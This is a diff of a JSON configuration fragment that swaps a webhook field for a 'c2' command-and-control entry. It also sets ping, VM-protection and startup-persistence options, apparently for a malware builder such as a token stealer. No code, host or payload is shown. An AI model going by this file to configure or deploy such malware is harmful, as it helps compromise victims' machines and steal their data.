@@ -1,6 +1,6 @@
 {
     "settings" : {
-        "webhook" : "",
+        "c2" : [0, ""],
         "pingme" : true,
         "vmprotect" : true,
         "startup" : true,
